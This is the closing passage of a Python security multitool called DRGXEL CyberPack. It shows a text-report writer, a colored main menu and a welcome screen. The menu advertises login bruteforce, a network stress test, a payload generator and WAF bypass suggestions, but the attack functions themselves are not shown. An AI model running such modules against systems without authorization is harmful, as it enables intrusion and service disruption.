        log_activity(f"PDF report generated: {filepath}")
        return filepath
    except Exception as e:
        print_error(f"PDF generation failed: {e}")
        import traceback
        traceback.print_exc()
        return None

def generate_text_report(target, scan_id, vulnerabilities, scan_mode="FULL SCAN"):
    """Generate text report as fallback"""
    reports_dir = os.path.expanduser("~/drgxel_reports")
    os.makedirs(reports_dir, exist_ok=True)
    
    sanitized_target = target.replace('https://', '').replace('http://', '').replace('/', '_')
    filename = f"leetscanner_report_{sanitized_target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    filepath = os.path.join(reports_dir, filename)
    
    with open(filepath, 'w') as f:
        f.write("=" * 70 + "\n")
        f.write("DRGXEL CyberPack - Security Vulnerability Report\n")
        f.write("=" * 70 + "\n\n")
        
        f.write(f"Target:    {target}\n")
        f.write(f"Scan Mode: {scan_mode}\n")
        f.write(f"Scan ID:   {scan_id}\n")
        f.write(f"Date:      {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        # Summary
        critical_count = len(vulnerabilities.get('critical', []))
        high_count = len(vulnerabilities.get('high', []))
        medium_count = len(vulnerabilities.get('medium', []))
        low_count = len(vulnerabilities.get('low', []))
        info_count = len(vulnerabilities.get('info', []))
        
        f.write("=" * 70 + "\n")
        f.write("EXECUTIVE SUMMARY\n")
        f.write("=" * 70 + "\n\n")
        f.write(f"CRITICAL: {critical_count}\n")
        f.write(f"HIGH:     {high_count}\n")
        f.write(f"MEDIUM:   {medium_count}\n")
        f.write(f"LOW:      {low_count}\n")
        f.write(f"INFO:     {info_count}\n\n")
        
        # Detailed findings
        f.write("=" * 70 + "\n")
        f.write("DETAILED FINDINGS\n")
        f.write("=" * 70 + "\n\n")
        
        vuln_num = 1
        for severity in ['critical', 'high', 'medium', 'low', 'info']:
            vulns = vulnerabilities.get(severity, [])
            if vulns:
                f.write(f"\n[{severity.upper()}] SEVERITY\n")
                f.write("-" * 70 + "\n\n")
                
                for vuln in vulns:
                    f.write(f"#{vuln_num} {vuln['name']}\n")
                    f.write(f"CVSS: {vuln.get('cvss', 'N/A')}\n")
                    f.write(f"Description: {vuln.get('description', 'N/A')}\n\n")
                    vuln_num += 1
    
    print_success(f"Text report generated: {filepath}")
    return filepath

def main_menu():
    """Main menu interface"""
    while True:
        clear_screen()
        print_banner()
        
        print("\033[1;36m═══════════════════ MAIN MENU ═══════════════════════\033[0m\n")
        print("  \033[1;32m[RECONNAISSANCE]\033[0m")
        print("  \033[1;33m[1]\033[0m  Recon Scanner")
        print("  \033[1;33m[2]\033[0m  Advanced Recon (ASN, Reverse IP, DNS, Certificate)")
        print("  \033[1;33m[3]\033[0m  Web Vulnerability Scanner")
        print("  \033[1;33m[4]\033[0m  Directory Bruteforce")
        
        print("\n  \033[1;32m[ADVANCED TESTING]\033[0m")
        print("  \033[1;33m[5]\033[0m  SQLi Vulnerability Checker")
        print("  \033[1;33m[6]\033[0m  XSS Scanner Mini")
        print("  \033[1;33m[7]\033[0m  Active WAF Detector")
        print("  \033[1;33m[8]\033[0m  Cookie & Session Audit")
        print("  \033[1;33m[9]\033[0m  Bruteforce Panel Login")
        print("  \033[1;33m[10]\033[0m API Fuzzer")
        print("  \033[1;33m[11]\033[0m DEEP SCANING WITH AUTO PDF")
        
        
        print("\n  \033[1;32m[OSINT & DARK WEB TOOLS]\033[0m")
        print("  \033[1;33m[12]\033[0m Username OSINT Checker")
        print("  \033[1;33m[13]\033[0m Email Breach Checker")
        print("  \033[1;33m[14]\033[0m PDF OSINT Toolkit")
        
        print("\n  \033[1;32m[SYSTEM & NETWORK]\033[0m")
        print("  \033[1;33m[15]\033[0m Device Information")
        print("  \033[1;33m[16]\033[0m Anti-DDoS Checker")
        print("  \033[1;33m[17]\033[0m Malware Scanner")
        print("  \033[1;33m[18]\033[0m Process Watchdog")
        print("  \033[1;33m[19]\033[0m Network Monitor")
        print("  \033[1;33m[20]\033[0m Network Stress Test")
        
        print("\n  \033[1;32m[UTILITIES]\033[0m")
        print("  \033[1;33m[21]\033[0m File Metadata Extractor")
        print("  \033[1;33m[22]\033[0m Payload Generator")
        print("  \033[1;33m[23]\033[0m DRGXEL SysLog")
        
        print("\n  \033[1;33m[0]\033[0m  Exit")
        print("\n\033[1;36m═════════════════════════════════════════════════════\033[0m")
        
        choice = input("\n\033[1;33m[DRGXEL]>\033[0m ").strip()
        
        if choice == '1':
            recon_menu()
        elif choice == '2':
            advanced_recon()
        elif choice == '3':
            web_vuln_scanner()
        elif choice == '4':
            directory_bruteforce()
        elif choice == '5':
            sqli_checker()
        elif choice == '6':
            xss_scanner()
        elif choice == '7':
            active_waf_detector()
        elif choice == '8':
            cookie_session_audit()
        elif choice == '9':
            bruteforce_login()
        elif choice == '10':
            api_fuzzer()
        elif choice == '11':
            leetscanner_menu()
        elif choice == '12':
            username_osint_checker()
        elif choice == '13':
            email_breach_checker()
        elif choice == '14':
            pdf_osint_toolkit()
        elif choice == '15':
            device_info()
        elif choice == '16':
            anti_ddos_checker()
        elif choice == '17':
            malware_scanner()
        elif choice == '18':
            process_watchdog()
        elif choice == '19':
            network_monitor()
        elif choice == '20':
            network_stress_test()
        elif choice == '21':
            file_metadata_extractor()
        elif choice == '22':
            payload_generator()
        elif choice == '23':
            view_syslog()
        elif choice == '0':
            clear_screen()
            print("\n\033[1;36m")
            print("╔═══════════════════════════════════════════════════════╗")
            print("║                                                       ║")
            print("║         Thank you for using DRGXEL CyberPack!        ║")
            print("║                                                       ║")
            print("║              Stay Safe, Stay Secure! 🛡️              ║")
            print("║                                                       ║")
            print("╚═══════════════════════════════════════════════════════╝")
            print("\033[0m\n")
            log_activity("DRGXEL CyberPack closed")
            sys.exit(0)
        else:
            print_error("Invalid option! Please select 0-22")
            time.sleep(1)

# ============================================================
# MAIN FUNCTION
# ============================================================

def main():
    """Main entry point"""
    try:
        # Initialize log file
        if not os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'w') as f:
                f.write(f"# DRGXEL CyberPack v{VERSION} - Log File\n")
                f.write(f"# Created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        log_activity("DRGXEL CyberPack started")
        
        # Check Python version
        if sys.version_info < (3, 6):
            print_error("Python 3.6 or higher is required!")
            sys.exit(1)
        
        # Display welcome screen
        clear_screen()
        print_banner()
        print("\033[1;32m")
        print("  Welcome to DRGXEL CyberPack v2.0 - PREMIUM EDITION!")
        print("  Single-File Python Security MegaTool")
        print("\033[0m")
        print("\033[1;33m")
        print("  ⚠️  WARNING: Use only on systems you own or have permission to test")
        print("  ⚠️  Educational purposes only - Use responsibly")
        
        # System information
        print(f"\n{Colors.OKCYAN}┌─────────────────────────────────────────────────────────────┐")
        print(f"│ {Colors.BOLD}SYSTEM INFORMATION{Colors.ENDC}{Colors.OKCYAN}                                          │")
        print(f"├─────────────────────────────────────────────────────────────┤{Colors.ENDC}")
        print(f"  {Colors.WHITE}Log File:{Colors.ENDC}    {Colors.GRAY}{LOG_FILE}{Colors.ENDC}")
        print(f"  {Colors.WHITE}OS:{Colors.ENDC}          {Colors.GRAY}{platform.system()} {platform.release()}{Colors.ENDC}")
        print(f"  {Colors.WHITE}Python:{Colors.ENDC}      {Colors.GRAY}{sys.version.split()[0]}{Colors.ENDC}")
        print(f"  {Colors.WHITE}Hostname:{Colors.ENDC}    {Colors.GRAY}{socket.gethostname()}{Colors.ENDC}")
        print(f"{Colors.OKCYAN}└─────────────────────────────────────────────────────────────┘{Colors.ENDC}")
        
        # Feature showcase
        print(f"\n{Colors.PURPLE}{Colors.BOLD}  ╔═══════════════════════════════════════════════════════════╗")
        print(f"  ║                  NEW FEATURES v{VERSION}                        ║")
        print(f"  ╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}")
        
        print(f"\n  {Colors.OKCYAN}[📡 RECONNAISSANCE - 4 Modules]{Colors.ENDC}")
        print(f"  {Colors.WHITE}├─{Colors.ENDC} Advanced Recon {Colors.OKGREEN}⭐ NEW{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ ASN Lookup (ISP, AS Number, Network Range){Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ Reverse IP Lookup (find shared domains){Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ Reverse DNS (IP → hostname){Colors.ENDC}")
        print(f"  {Colors.GRAY}│  └─ Certificate Inspector (SSL/TLS analysis){Colors.ENDC}")
        print(f"\n  {Colors.WARNING}[🎯 TESTING - Tools]{Colors.ENDC}")
        print(f"  {Colors.WHITE}├─{Colors.ENDC} Active WAF Detector {Colors.OKGREEN}⭐ NEW{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ Detect 8 WAFs (Cloudflare, Imperva, Akamai, etc){Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ 5 detection methods (headers, patterns, timing){Colors.ENDC}")
        print(f"  {Colors.GRAY}│  └─ Bypass suggestions for each WAF{Colors.ENDC}")
        print(f"  {Colors.WHITE}├─{Colors.ENDC} Cookie & Session Audit {Colors.OKGREEN}⭐ NEW{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ Security flags analysis (Secure, HttpOnly, SameSite){Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ Session ID entropy & predictability check{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ JWT token analysis & weakness detection{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ Session fixation testing{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  └─ Cookie hijacking risk assessment{Colors.ENDC}")    
        print(f"  {Colors.WHITE}├─{Colors.ENDC} DEEPSCAN WITH PDF {Colors.OKGREEN}⭐ NEW AND RECOMENDASI🔥{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ Full All Testing tools and something tools advance{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ VULN SCANNING (HIGH RISK) JUSG URL AND THIS TOOLS AUTOMATICLY SCANNING{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ XSS SCANNING FOKUS, JUST URL NOT WITH PARAMETER{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─SQLI FOCUS SCANNING LIKE XSS JUST URL NOT WITH PARAMETER{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ SANS TOP 25 SCANNING{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ OWASP TOP 10 SCANNING{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  ├─ COSTUM SCAN{Colors.ENDC}")
        print(f"  {Colors.GRAY}│  └─ NOTE : THIS TOOLS NO LIMITS SO USE THIS TOOLS FOR LEGAL SCANNING (ONLY TO YOUR WIBSITE OR BOUNTY HUNTER EVENT){Colors.ENDC}")    
        
        input("\n\033[1;33m  Press Enter to start...\033[0m")
        
        # Start main menu
        main_menu()
    
    except KeyboardInterrupt:
        print("\n\n\033[1;33m[!] Interrupted by user\033[0m")
        log_activity("Program interrupted by user")
        sys.exit(0)
    except Exception as e:
        print_error(f"Fatal error: {e}")
        log_activity(f"Fatal error: {e}")
        sys.exit(1)

# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    main()